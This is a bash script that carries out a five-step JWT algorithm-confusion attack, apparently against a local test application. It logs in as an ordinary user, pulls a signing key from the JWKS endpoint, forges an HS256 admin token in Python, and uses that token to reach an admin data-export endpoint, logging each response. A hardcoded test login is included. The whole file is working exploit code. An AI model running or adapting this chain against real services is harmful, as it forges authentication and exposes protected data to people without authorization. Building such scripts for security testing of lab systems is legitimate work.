#!/bin/bash
# Chain 3: JWT Algorithm Confusion (5 steps)
# Login → discover JWKS → extract key → forge admin JWT → exfil data

BASE="http://localhost:8888"
LOG="test_logs/chain3_jwt.log"
> "$LOG"

echo "=== Chain 3: JWT Algorithm Confusion ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Normal login to get a JWT
echo "--- Step 1: Login as normal user ---" | tee -a "$LOG"
LOGIN_RESP=$(curl -s -X POST "$BASE/chains/jwt/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"fleet.viewer@vehitrack.io","password":"Dusk!maze22"}')
echo "$LOGIN_RESP" | tee -a "$LOG"
echo "" | tee -a "$LOG"

USER_TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "User token: ${USER_TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Verify normal profile access works
echo "--- Verify: Profile with user token ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $USER_TOKEN" "$BASE/chains/jwt/profile" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Verify admin export fails with user token
echo "--- Verify: Admin export fails with user role ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $USER_TOKEN" "$BASE/chains/jwt/admin/export" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 2: Discover JWKS endpoint (recon)
echo "--- Step 2: Discover JWKS endpoint ---" | tee -a "$LOG"
JWKS_RESP=$(curl -s "$BASE/chains/jwt/.well-known/jwks.json")
echo "$JWKS_RESP" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Extract the key
JWT_SECRET=$(echo "$JWKS_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['keys'][0]['k'])")
echo "Extracted key: $JWT_SECRET" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3-4: Forge an admin JWT using HS256 with the extracted key
echo "--- Step 3-4: Forge admin JWT with extracted key ---" | tee -a "$LOG"
FORGED_TOKEN=$(python3 -c "
import jwt, time
token = jwt.encode(
    {'sub': 'sysop@vehitrack.internal', 'role': 'admin', 'name': 'Admin',
     'iat': int(time.time()), 'exp': int(time.time()) + 3600},
    '$JWT_SECRET', algorithm='HS256')
print(token)
")
echo "Forged admin token: ${FORGED_TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 5: Use forged token to access admin export
echo "--- Step 5: Access admin export with forged token ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $FORGED_TOKEN" "$BASE/chains/jwt/admin/export" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Verify profile shows admin
echo "--- Verify: Profile shows admin role ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $FORGED_TOKEN" "$BASE/chains/jwt/profile" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "=== Chain 3 Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
